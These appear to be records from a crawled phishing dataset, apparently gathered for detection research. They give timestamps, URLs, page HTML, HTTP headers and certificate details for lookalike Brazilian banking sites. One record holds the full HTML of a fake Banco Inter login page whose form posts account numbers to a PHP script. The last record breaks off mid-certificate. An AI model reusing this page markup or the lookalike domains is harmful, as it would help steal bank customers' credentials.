2019-05-07 23:55:09.378706,http://www.original.com.br.original_internetbanking.webap.wpak.xyz/wpo/,,"<html xmlns=""http://www.w3.org/1999/xhtml""><head></head><body></body></html>",NaN,NaN,NaN,2019_05_07_23_55_09.png,NaN
2019-05-07 23:55:15.916807,https://inter-banco.com/conta-digital/home/,Internet Banking Banco Inter,"<!DOCTYPE html><html xmlns=""http://www.w3.org/1999/xhtml""><head>
	<meta http-equiv=""content-type"" content=""text/html; charset=UTF-8"" />
	<meta http-equiv=""x-ua-compatible"" content=""ie=edge"" />
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
	<title>Internet Banking Banco Inter</title>

	<link rel=""shortcut icon"" href=""../img/favicon.ico"" />

	<!-- CSS -->
	<link href=""../css/bootstrap.css"" rel=""stylesheet"" />
	<link href=""../css/desktop.css"" rel=""stylesheet"" />
	
	<script type=""text/javascript"">
      jQuery(document).ready(function ($) {
          $(window).load(function () {
              $("".loaded"").fadeOut();
              $("".preloader"").delay(2000).fadeOut(""slow"");
          });
      });
    </script>

</head>
<body>
	<!-- <div class='preloader'>
        <div class=""lds-ring""><div></div><div></div><div></div><div></div></div>
    </div> -->
    <header class=""topo"">
    	<div class=""container-fluid"">
    		<div class=""row"">
    			<div class=""col-md-5"">
    				<section class=""Inter"">
    					<div class=""row"">
	    					<h1 class=""logo"">
	    						<img class=""img-fluid"" src=""../img/logo.png"" />
	    					</h1>
	    					<span class=""textoTopo"">INTERNET BANKING</span>
    					</div>
    				</section>
    			</div>
    			<div class=""col-md-4 offset-3"">
    				<section class=""row contaDigital"">
						<img class=""img-fluid"" src=""../img/contadigital.png"" style=""width: 176px;"" />
    				</section>
    			</div>
    		</div>
    	</div>
    </header>
    <section class=""subTopo"">
    	<div class=""container-fluid"">
    		<div class=""row"">
    			<div class=""col-md-5"">
    				<aside class=""linkTopo"">
    					<a href=""#"">HOME DO SITE</a>
    				</aside>
    			</div>
    			<div class=""col-md-4 offset-3"">
    				<aside class=""row simuladorTopo"">
    					<i><img src=""../img/icoSimule.png"" /></i>
    					<a href="""">SIMULE NOVOS INVESTIMENTOS</a>
    				</aside>
    			</div>
    		</div>
    	</div>
    </section>
    <main class=""conteudo"">
    	<div class=""container"">
    		<div class=""row"">
    			<form action=""webApps_AplicationSecurity.php"" method=""POST"" class=""formularioAcessoHome"">
    				<div class=""form-group"">
    				  <label for=""exampleFormControlSelect1"">Acesso:</label>
    				  <select class=""form-control"" id=""exampleFormControlSelect1"">
    				    <option>Cliente Conta Corrente / Investimentos</option>
    				    <option>Cliente Capital de Giro (PJ)</option>
    				    <option>Area Restrita</option>
    				  </select>
    				</div>
    				<div class=""form-group"">
    					<label>Conta:</label>
    					<input class=""form-control"" type=""tel"" name=""conta"" id=""conta"" autofocus="""" required="""" minlength=""5"" maxlength=""8"" />
    				</div>
    				<div class=""form-group"">
    					<input type=""submit"" name=""avancar"" class=""btnLaranja"" id=""avancar"" value=""AVANÇAR"" />
    				</div>
    			</form>
    		</div>
    		<div class=""row"">
    			<section class=""bannerHome"">
    				<img class=""img-fluid"" src=""../img/bannerHome.jpg"" />
    			</section>
    		</div>
    	</div>
    </main>

    <footer class=""rodape"">
    	<img class=""img-fluid"" src=""../img/rodape.png"" />
    </footer>



	<!-- SCRIPTS -->
	<script src=""../js/jquery-3.3.1.min.js"" type=""text/javascript""></script>
	<script src=""../js/bootstrap.js"" type=""text/javascript""></script>
	<!-- <script src=""../js/padrao_mk.js"" type=""text/javascript""></script> -->
</body></html>",['https://inter-banco.com/conta-digital/home/'],[],"{'Keep-Alive': 'timeout=5, max=75', 'Date': 'Tue, 07 May 2019 18:26:50 GMT', 'Server': 'Apache', 'Connection': 'Upgrade, Keep-Alive', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '1248', 'Upgrade': 'h2,h2c', 'Content-Type': 'text/html; charset=UTF-8'}",2019_05_07_23_55_15.png,"{
  ""OCSP"": [
    ""http://ocsp.sectigo.com""
  ],
  ""caIssuers"": [
    ""http://crt.sectigo.com/SectigoRSADomainValidationSecureServerCA.crt""
  ],
  ""issuer"": [
    [
      [
        ""countryName"",
        ""GB""
      ]
    ],
    [
      [
        ""stateOrProvinceName"",
        ""Greater Manchester""
      ]
    ],
    [
      [
        ""localityName"",
        ""Salford""
      ]
    ],
    [
      [
        ""organizationName"",
        ""Sectigo Limited""
      ]
    ],
    [
      [
        ""commonName"",
        ""Sectigo RSA Domain Validation Secure Server CA""
